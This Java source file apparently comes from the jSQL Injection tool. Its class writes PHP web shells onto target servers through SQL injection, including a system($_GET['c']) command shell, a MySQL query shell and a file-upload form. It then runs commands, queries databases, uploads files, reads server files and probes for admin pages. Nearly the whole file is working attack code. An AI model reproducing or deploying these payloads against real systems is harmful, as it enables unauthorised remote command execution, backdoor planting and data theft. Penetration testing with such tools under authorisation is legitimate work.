/*******************************************************************************
 * Copyhacked (H) 2012-2016.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.MediatorModel;
import com.jsql.model.bean.util.Request;
import com.jsql.model.bean.util.TypeHeader;
import com.jsql.model.bean.util.TypeRequest;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.StringUtil;
import com.jsql.view.scan.ScanListTerminal;
import com.jsql.view.swing.MediatorGui;
import com.jsql.view.swing.list.ListItem;

/**
 * Ressource access object.
 * Get informations from file system, commands, webpage.
 */
public class RessourceAccess {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(RessourceAccess.class);

    /**
     * File name for web shell.
     */
    public static final String FILENAME_WEBSHELL = 
        "."+ InjectionModel.VERSION_JSQL + ".jw.php";
    
    /**
     * File name for sql shell.
     */
    public static final String FILENAME_SQLSHELL = 
        "."+ InjectionModel.VERSION_JSQL + ".js.php";
    
    /**
     * File name for upload form.
     */
    public static final String FILENAME_UPLOAD = 
        "."+ InjectionModel.VERSION_JSQL + ".ju.php";
    
    /**
     * True if admin page sould stop, false otherwise.
     */
    private static boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list sould stop, false otherwise.
     */
    private static boolean isScanStopped = false;

    /**
     * True if file search must stop, false otherwise.
     */
    private static boolean isSearchFileStopped = false;

    /**
     * True if current user has right to read file. 
     */
    private static boolean readingIsAllowed = false;

    private RessourceAccess() {
        
    }

    /**
     * Check if every page in the list responds 200 OK.
     * @param urlInjection
     * @param pageNames List of admin pages ot test
     * @throws InterruptedException 
     */
    public static void createAdminPages(String urlInjection, List<ListItem> pageNames) throws InterruptedException {
        String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
        String urlProtocol = urlInjection.replace(urlWithoutProtocol, "");
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");
        
        List<String> directoryNames = new ArrayList<>();
        if (urlWithoutFileName.split("/").length == 0) {
            directoryNames.add("/");
        }
        for (String directoryName: urlWithoutFileName.split("/")) {
            directoryNames.add(directoryName + "/");
        }

        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<CallableAdminPage> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        String urlPart = "";
        for (String segment: directoryNames) {
            urlPart += segment;

            for (ListItem pageName: pageNames) {
                taskCompletionService.submit(new CallableAdminPage(urlProtocol + urlPart + pageName.toString()));
            }
        }

        int nbAdminPagesFound = 0;
        int submittedTasks = directoryNames.size() * pageNames.size();
        for (
            int tasksHandled = 0; 
            tasksHandled < submittedTasks && !RessourceAccess.isSearchAdminStopped; 
            tasksHandled++
        ) {
            try {
                CallableAdminPage currentCallable = taskCompletionService.take().get();
                if (currentCallable.isHttpResponseOk()) {
                    Request request = new Request();
                    request.setMessage(TypeRequest.CREATE_ADMIN_PAGE_TAB);
                    request.setParameters(currentCallable.getUrl());
                    MediatorModel.model().sendToViews(request);

                    nbAdminPagesFound++;
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while checking Admin pages", e);
            }
        }

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);

        RessourceAccess.isSearchAdminStopped = false;

        if (nbAdminPagesFound > 0) {
            LOGGER.debug("Admin page(s) found: " + nbAdminPagesFound + "/" + submittedTasks);
        } else {
            LOGGER.trace("Admin page(s) found: " + nbAdminPagesFound + "/" + submittedTasks);
        }

        Request request = new Request();
        request.setMessage(TypeRequest.END_ADMIN_SEARCH);
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Create a webshell in the server.
     * @param pathShell Remote path othe file
     * @param url
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     */
    public static void createWebShell(String pathShell, String urlShell) throws JSqlException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String payloadWeb = "<SQLi><?php system($_GET['c']); ?><iLQS>";

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().vendor.instance().sqlTextIntoFile(payloadWeb, pathShellFixed + FILENAME_WEBSHELL)
        );

        String resultInjection;
        String[] sourcePage = {""};
        try {
            resultInjection = new SuspendableGetRows().run(
                MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_WEBSHELL),
                sourcePage,
                false,
                1,
                null
            );

            if ("".equals(resultInjection)) {
                throw new JSqlException("Payload integrity verification: Empty payload");
            }
        } catch(JSqlException e) {
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }
        
        String url = urlShell;
        if ("".equals(url)) {
            url = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
        }

        if (resultInjection.indexOf(payloadWeb) > -1) {
            LOGGER.info("Web payload deployed at \""+ url + FILENAME_WEBSHELL +"\" in \""+ pathShellFixed + FILENAME_WEBSHELL +"\"");
            
            Request request = new Request();
            request.setMessage(TypeRequest.CREATE_SHELL_TAB);
            request.setParameters(pathShellFixed, url);
            MediatorModel.model().sendToViews(request);
        } else {
            throw new JSqlException("Incorrect Web payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
    }
    
    private static String runCommandShell(String urlCommand) throws IOException {
        URLConnection connection;

        String url = urlCommand;
        connection = new URL(url).openConnection();
        connection.setReadTimeout(ConnectionUtil.TIMEOUT);
        connection.setConnectTimeout(ConnectionUtil.TIMEOUT);

        String pageSource = "";
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
        }

        Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
        regexSearch.find();

        String result;
        // IllegalStateException #1544: catch incorrect execution
        try {
            result = regexSearch.group(1);
        } catch (IllegalStateException e) {
            // Fix return null from regex
            result = "";
            LOGGER.warn("Incorrect response from Web shell", e);
        }
        
        Map<TypeHeader, Object> msgHeader = new HashMap<>();
        msgHeader.put(TypeHeader.URL, url);
        msgHeader.put(TypeHeader.POST, "");
        msgHeader.put(TypeHeader.HEADER, "");
        msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHttpHeaders(connection));
        msgHeader.put(TypeHeader.SOURCE, pageSource);
        
        Request request = new Request();
        request.setMessage(TypeRequest.MESSAGE_HEADER);
        request.setParameters(msgHeader);
        MediatorModel.model().sendToViews(request);
        
        return result;
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlShell Web path of the shell
     */
    public static void runWebShell(String command, UUID uuidShell, String urlShell) {
        String result = "";
        
        try {
            result = runCommandShell(
                urlShell + FILENAME_WEBSHELL + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1")
            );
            
            if ("".equals(result)) {
                result = "No result.\nTry \"" + command.trim() + " 2>&1\" to get a system error message.\n";
            }
        } catch (UnsupportedEncodingException e) {
            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e, e);
        } catch (IOException e) {
            LOGGER.warn("Shell execution error: "+ e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage(TypeRequest.GET_WEB_SHELL_RESULT);
            request.setParameters(uuidShell, result);
            MediatorModel.model().sendToViews(request);
        }
    }

    /**
     * Create SQL shell on the server. Override user name and password eventually.
     * @param pathShell Script to create on the server
     * @param url URL for the script (used for url rewriting)
     * @param username User name for current database
     * @param password User password for current database
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     */
    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String payloadSQL = 
            "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
                + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');"
                + "if(is_resource($result)){"
                    + "echo'<SQLr>';"
                    + "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';"
                + "}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';"
                + "else if($result==FALSE)echo'<SQLm>Query failed';"
            + " ?><iLQS>";

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().vendor.instance().sqlTextIntoFile(payloadSQL, pathShellFixed + FILENAME_SQLSHELL)
        );

        String resultInjection = "";
        String[] sourcePage = {""};
        try {
            resultInjection = new SuspendableGetRows().run(
                MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_SQLSHELL),
                sourcePage,
                false,
                1,
                null
            );
            
            if ("".equals(resultInjection)) {
                throw new JSqlException("Bad payload integrity: Empty payload");
            }
        } catch(JSqlException e) {
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }
        
        String url = urlShell;
        if ("".equals(url)) {
            url = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
        }

        if (resultInjection.indexOf(payloadSQL) > -1) {
            LOGGER.info("SQL payload deployed at \""+ url + FILENAME_SQLSHELL +"\" in \""+ pathShellFixed + FILENAME_SQLSHELL +"\"");
            
            Request request = new Request();
            request.setMessage(TypeRequest.CREATE_SQL_SHELL_TAB);
            request.setParameters(pathShellFixed, url, username, password);
            MediatorModel.model().sendToViews(request);
        } else {
            throw new JSqlException("Incorrect SQL payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlShell URL to send SQL request against
     * @param username User name [optional]
     * @param password USEr password [optional]
     */
    public static void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
        String result = "";
        try {
            result = runCommandShell(
                urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password
            );
            
            if (result.indexOf("<SQLr>") > -1) {
                List<List<String>> listRows = new ArrayList<>();
                Matcher rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
                while (rowsMatcher.find()) {
                    String values = rowsMatcher.group(1);

                    Matcher fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
                    List<String> listFields = new ArrayList<>();
                    listRows.add(listFields);
                    while (fieldsMatcher.find()) {
                        String field = fieldsMatcher.group(1);
                        listFields.add(field);
                    }
                }

                if (!listRows.isEmpty()) {
                    List<Integer> listFieldsLength = new ArrayList<>();
                    for (
                        final int[] indexLongestRowSearch = {0}; 
                        indexLongestRowSearch[0] < listRows.get(0).size(); 
                        indexLongestRowSearch[0]++
                    ) {
                        Collections.sort(
                            listRows, 
                            new Comparator<List<String>>() {
                                @Override
                                public int compare(List<String> firstRow, List<String> secondRow) {
                                    return secondRow.get(indexLongestRowSearch[0]).length() - firstRow.get(indexLongestRowSearch[0]).length();
                                }
                            }
                        );

                        listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch[0]).length());
                    }

                    if (!"".equals(result)) {
                        String tableText = "+";
                        for (Integer fieldLength: listFieldsLength) {
                            tableText += "-"+ StringUtils.repeat("-", fieldLength) +"-+";
                        }
                        tableText += "\n";

                        for (List<String> listFields: listRows) {
                            tableText += "|";
                            int cursorPosition = 0;
                            for (String field: listFields) {
                                tableText += " "+ field + StringUtils.repeat(" ", listFieldsLength.get(cursorPosition) - field.length()) +" |";
                                cursorPosition++;
                            }
                            tableText += "\n";
                        }

                        tableText += "+";
                        for (Integer fieldLength: listFieldsLength) {
                            tableText += "-"+ StringUtils.repeat("-", fieldLength) +"-+";
                        }
                        tableText += "\n";
                        
                        result = tableText;
                    }
                }
            } else if (result.indexOf("<SQLm>") > -1) {
                result = result.replace("<SQLm>", "") + "\n";
            } else if (result.indexOf("<SQLe>") > -1) {
                result = result.replace("<SQLe>", "") + "\n";
            }
        } catch (UnsupportedEncodingException e) {
            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e, e);
        } catch (IOException e) {
            LOGGER.warn("Shell execution error: "+ e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage(TypeRequest.GET_SQL_SHELL_RESULT);
            request.setParameters(uuidShell, result, command);
            MediatorModel.model().sendToViews(request);
        }
    }

    /**
     * Upload a file to the server.
     * @param pathFile Remote path of the file to upload
     * @param url URL of uploaded file
     * @param file File to upload
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     * @throws IOException 
     */
    public static void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String sourceShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";

        String pathShellFixed = pathFile;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().vendor.instance().sqlTextIntoFile("<SQLi>"+ sourceShellToInject +"<iLQS>", pathShellFixed + FILENAME_UPLOAD)
        );

        String[] sourcePage = {""};
        String sourceShellInjected;
        try {
            sourceShellInjected = new SuspendableGetRows().run(
                MediatorModel.model().vendor.instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
                sourcePage,
                false,
                1,
                null
            );
            
            if ("".equals(sourceShellInjected)) {
                throw new JSqlException("Bad payload integrity: Empty payload");
            }
        } catch(JSqlException e) {
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }

        String urlFileFixed = urlFile;
        if ("".equals(urlFileFixed)) {
            urlFileFixed = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
        }
        
        if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
            LOGGER.info("Upload payload deployed at \""+ urlFileFixed + FILENAME_UPLOAD +"\" in \""+ pathShellFixed + FILENAME_UPLOAD +"\"");
            
            String crLf = "\r\n";
            
            URL urlUploadShell = new URL(urlFileFixed +"/"+ FILENAME_UPLOAD);
            URLConnection connection = urlUploadShell.openConnection();
            connection.setDoOutput(true);
            
            try (
                InputStream streamToUpload = new FileInputStream(file);
            ) {

                byte[] streamData = new byte[streamToUpload.available()];
                if (streamToUpload.read(streamData) == -1) {
                    throw new JSqlException("Error reading the file");
                }
                
                String headerForm = "";
                headerForm += "-----------------------------4664151417711" + crLf;
                headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() +"\""+ crLf;
                headerForm += "Content-Type: binary/octet-stream" + crLf;
                headerForm += crLf;

                String headerFile = "";
                headerFile += crLf + "-----------------------------4664151417711--" + crLf;

                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                connection.setRequestProperty("Content-Length", String.valueOf(headerForm.length() + headerFile.length() + streamData.length));

                try (
                    OutputStream streamOutputFile = connection.getOutputStream();
                ) {
                    streamOutputFile.write(headerForm.getBytes());
    
                    int index = 0;
                    int size = 1024;
                    do {
                        if (index + size > streamData.length) {
                            size = streamData.length - index;
                        }
                        streamOutputFile.write(streamData, index, size);
                        index += size;
                    } while (index < streamData.length);
    
                    streamOutputFile.write(headerFile.getBytes());
                    streamOutputFile.flush();
                }
                
                try (
                    InputStream streamInputFile = connection.getInputStream();
                ) {
                    char buff = 512;
                    int len;
                    byte[] data = new byte[buff];
                    String result = "";
                    do {
                        len = streamInputFile.read(data);
    
                        if (len > 0) {
                            result += new String(data, 0, len);
                        }
                    } while (len > 0);
    
                    if (result.indexOf("SQLiy") > -1) {
                        LOGGER.debug("Upload successful");
                    } else {
                        LOGGER.warn("Upload failed");
                    }
                    
                    Map<TypeHeader, Object> msgHeader = new HashMap<>();
                    msgHeader.put(TypeHeader.URL, urlFileFixed);
                    msgHeader.put(TypeHeader.POST, "");
                    msgHeader.put(TypeHeader.HEADER, "");
                    msgHeader.put(TypeHeader.RESPONSE, StringUtil.getHttpHeaders(connection));
                    msgHeader.put(TypeHeader.SOURCE, result);
    
                    Request request = new Request();
                    request.setMessage(TypeRequest.MESSAGE_HEADER);
                    request.setParameters(msgHeader);
                    MediatorModel.model().sendToViews(request);
                } 
            }
        } else {
            throw new JSqlException("Incorrect Upload payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
        
        Request request = new Request();
        request.setMessage(TypeRequest.END_UPLOAD);
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     */
    public static boolean isReadingAllowed() throws JSqlException {
        String[] sourcePage = {""};

        String resultInjection = new SuspendableGetRows().run(
            MediatorModel.model().vendor.instance().sqlPrivilegeTest(),
            sourcePage,
            false,
            1,
            null
        );

        if ("".equals(resultInjection)) {
            MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            Request request = new Request();
            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_INVULNERABLE);
            MediatorModel.model().sendToViews(request);
            readingIsAllowed = false;
        } else if ("false".equals(resultInjection)) {
            LOGGER.warn("No FILE privilege");
            Request request = new Request();
            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_INVULNERABLE);
            MediatorModel.model().sendToViews(request);
            readingIsAllowed = false;
        } else {
            Request request = new Request();
            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_VULNERABLE);
            MediatorModel.model().sendToViews(request);
            readingIsAllowed = true;
        }
        
        return readingIsAllowed;
    }
    
    /**
     * Create a panel for each file in the list.
     * @param pathsFiles List of file to read
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     * @throws InterruptedException 
     * @throws ExecutionException 
     */
    public static void readFile(List<ListItem> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }

        int countFileFound = 0;
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        for (ListItem pathFile: pathsFiles) {
            taskCompletionService.submit(new CallableFile(pathFile.toString()));
        }

        List<String> duplicate = new ArrayList<>();
        int submittedTasks = pathsFiles.size();
        
        try {
            for (int tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
                CallableFile currentCallable = taskCompletionService.take().get();
                if (!"".equals(currentCallable.getFileSource())) {
                    String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
                    String content = currentCallable.getFileSource();
                    String path = currentCallable.getUrl();
    
                    Request request = new Request();
                    request.setMessage(TypeRequest.CREATE_FILE_TAB);
                    request.setParameters(name, content, path);
                    MediatorModel.model().sendToViews(request);
    
                    if (!duplicate.contains(path.replace(name, ""))) {
                        LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
                    }
                    duplicate.add(path.replace(name, ""));
    
                    countFileFound++;
                }
                
                if (RessourceAccess.isSearchFileStopped) {
                    throw new StoppedByUserException();
                }
            }
        } finally {
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
            
            RessourceAccess.isSearchFileStopped = false;
            
            if (countFileFound > 0) {
                LOGGER.debug("File(s) found: " + countFileFound + "/" + submittedTasks);
            } else {
                LOGGER.trace("File(s) found: " + countFileFound + "/" + submittedTasks);
            }
            Request request = new Request();
            request.setMessage(TypeRequest.END_FILE_SEARCH);
            MediatorModel.model().sendToViews(request);
        }
    }
    
    public static void scanList(List<ListItem> urlList) {
        // Erase everything in the view from a previous injection
        Request requests = new Request();
        requests.setMessage(TypeRequest.RESET_INTERFACE);
        MediatorModel.model().sendToViews(requests);
        
        // wait for ending of ongoing interaction between two injections
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            LOGGER.error("Interruption while sleeping during scan", e);
            Thread.currentThread().interrupt();
        }

        // Display result only in console
        MediatorModel.model().deleteObservers();
        MediatorModel.model().addObserver(new ScanListTerminal());
        
        MediatorModel.model().isScanning = true;
        RessourceAccess.isScanStopped = false;
        
        for (ListItem url: urlList) {
            if (MediatorModel.model().isStoppedByUser() || RessourceAccess.isScanStopped) {
                break;
            }
            LOGGER.info("Scanning " + url);
            MediatorModel.model().controlInput(url.toString(), "", "", MethodInjection.QUERY, "POST", true);
            
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                LOGGER.error("Interruption while sleeping between two scans", e);
                Thread.currentThread().interrupt();
            }
        }
        
        // Get back the normal view
        MediatorModel.model().addObserver(MediatorGui.frame());
        
        MediatorModel.model().isScanning = false;
        MediatorModel.model().setIsStoppedByUser(false);
        RessourceAccess.isScanStopped = false;

        Request request = new Request();
        request.setMessage(TypeRequest.END_SCAN_LIST);
        MediatorModel.model().sendToViews(request);
    }
    
    public static boolean isSearchAdminStopped() {
        return isSearchAdminStopped;
    }

    public static void setSearchAdminStopped(boolean isSearchAdminStopped) {
        RessourceAccess.isSearchAdminStopped = isSearchAdminStopped;
    }
    
    public static void setScanStopped(boolean isScanStopped) {
        RessourceAccess.isScanStopped = isScanStopped;
    }

    public static void setSearchFileStopped(boolean isSearchFileStopped) {
        RessourceAccess.isSearchFileStopped = isSearchFileStopped;
    }

    public static boolean isReadingIsAllowed() {
        return readingIsAllowed;
    }

    public static void setReadingIsAllowed(boolean readingIsAllowed) {
        RessourceAccess.readingIsAllowed = readingIsAllowed;
    }
}
